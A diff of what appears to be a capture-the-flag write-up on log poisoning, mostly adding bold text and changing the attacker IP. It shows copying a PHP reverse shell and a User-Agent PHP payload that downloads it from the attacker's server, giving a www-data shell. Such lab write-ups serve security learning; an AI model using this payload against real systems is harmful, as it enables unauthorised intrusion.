@@ -106,13 +106,13 @@ This screenshot shows the page source, you can see the log shows some of the tim
 
 ![log](https://imgur.com/wENytd2.png)
 
-We need to intercept the data to add our own code in the access log. Use burp suite to capture the request:
+We need to **intercept** the data to add our own code in the access log. Use burp suite to capture the request:
 
 ![burp](https://imgur.com/HhCALR2.png)
 
 The above request was intercepted. The User-Agent field will need to be changed to our php code so it can download our own file. 
 
-Let's firstly create a php reverse shell on our local machine so we can include this file. Kali Linux has a set of pre-made reverse shells. Copy the php reverse shell file to the current directory:
+Let's firstly create a **php reverse shell** on our local machine so we can include this file. Kali Linux has a set of pre-made reverse shells. Copy the php reverse shell file to the current directory:
 
 <pre>cp /usr/share/webshells/php/php-reverse-shell.php .</pre>
 
@@ -130,9 +130,9 @@ This will allow us to transfer the file to the victim.
 
 Now we can add the following command to our intercepted HTTP request using the php reverse shell we just created:
 
-<pre>&lt;?php file_put_contents('shell.php', file_get_contents('http://192.168.145.4:9090/php-reverse-shell.php'))?&gt;</pre>
+<pre>&lt;?php file_put_contents('shell.php', file_get_contents('http://10.9.6.63:9090/php-reverse-shell.php'))?&gt;</pre>
 
-<?php file_put_contents('shell.php', file_get_contents('http://192.168.145.4:9090/php-reverse-shell.php'))?>
+<?php file_put_contents('shell.php', file_get_contents('http://10.9.6.63:9090/php-reverse-shell.php'))?>
 
 ![burp request modified](https://imgur.com/wYiso6h.png)
 
@@ -147,7 +147,7 @@ Accept-Encoding: gzip, deflate
 Connection: close
 Upgrade-Insecure-Requests: 1</pre>
 
-Once this was done, I had a confirmation of a download from the simple HTTP server:
+Once this was done, I had a confirmation of a download from the simple HTTP server on my local machine:
 
 <pre>10.10.235.173 - - [06/Jun/2020 08:15:48] "GET /php-reverse-shell.php HTTP/1.0" 200 -</pre>
 
@@ -159,7 +159,7 @@ Go to /shell.php or whatever you named the file in php code:
 
 ![rev shell](https://imgur.com/WRVfreG.png)
 
-We are logged in as www-data.
+We are logged in as **www-data**.
 
 ## Privilege Escalation
 
